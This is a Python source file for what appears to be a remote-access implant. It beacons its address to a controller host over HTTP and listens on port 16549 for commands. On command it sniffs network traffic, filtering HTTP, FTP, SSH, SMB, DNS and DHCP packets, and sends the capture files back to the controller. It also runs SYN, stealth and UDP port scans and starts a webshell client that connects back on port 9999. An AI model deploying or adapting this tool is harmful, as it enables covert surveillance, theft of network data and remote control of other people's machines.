import socket
import time
from threading import Thread
import Packages_Installer
import PACKET_SNIFFER as snf
from PortScanner import PortScanner
from Webshell_Client import Client
from helper_methods import *
import requests

class Server(Thread):
    def __init__(self, IP: str, target_ip: str):
        self.IP = IP
        self.target_ip = target_ip
        self.conn = socket.socket()
        self.conn.bind((IP, 16549))
        self.conn.listen(100)
        requests.post(f'http://{target_ip}/ping', data=f"I am listening\n IP address: {get_ip_address()}")
        print('[+] Listening for income TCP connection on port 16549')
        self.conn, self.addr = self.conn.accept()
        print('[+]We got a connection from', self.addr)
        self.start_time = time.time()
        self.timer = Thread(target=self.check_time).start()
        self.run()

    def run(self) -> None:
        while True:
            length = self.conn.recv(1024).decode()
            while not length:
                length = self.conn.recv(1024).decode()
            msg = self.conn.recv(int(length)).decode()
            print(msg)
            if msg == 'SNF_SRT':
                st = ''
                print('Sniffing Started')
                sorted_packets, path = snf.gen_sniff()
                st += snf.filter_HTTP(sorted_packets[0]) + snf.filter_ICMP(sorted_packets[1]) + snf.filter_SMB(
                    sorted_packets[2])
                st += snf.filter_FTP(sorted_packets[3]) + snf.filter_SSH(sorted_packets[4]) + snf.filterstringDNS(
                    sorted_packets[5]) + snf.filter_DHCP(sorted_packets[6])
                self.conn.send(str(len(st)).encode())
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                time.sleep(3)
                self.transfer(path)
                continue
            elif msg == 'SYN_SRT':
                open_ports = PortScanner(get_ip_address()).SYN_Scan_Wrap()
                if open_ports == []:
                    st = 'No TCP ports are open'
                else:
                    st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'STEALTH_SRT':
                open_ports = PortScanner(get_ip_address()).Stealth_Scan_Wrap()
                st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'UDP_SRT':
                open_ports = PortScanner(get_ip_address()).UDP_Scan_Wrap()
                st = ''
                for open_port in open_ports:
                    st += f"Port {open_port} is open!" + '\n'
                self.conn.send(str(len(st)).encode('ISO-8859-1', errors='ignore'))
                self.conn.send(st.encode('ISO-8859-1', errors='ignore'))
                continue
            elif msg == 'REV_ACT':
                Client(self.addr[0], 9999).run()
            elif msg == 'EXIT':
                self.conn.shutdown(socket.SHUT_RDWR)
                self.conn.close()
                self.__init__(self.IP, self.target_ip)

    def transfer(self, path):
        import os
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
        else:
            self.conn.send(f'File not found in path: {path}'.encode('ISO-8859-1', errors='ignore'))

    def check_time(self):
        while True:
            if time.time() - self.start_time > 120:
                self.conn.shutdown(socket.SHUT_RDWR)
                self.__init__(self.IP, self.target_ip)

def main():
    server = Server('10.0.0.11', '10.0.0.11')


if __name__ == '__main__':
    main()
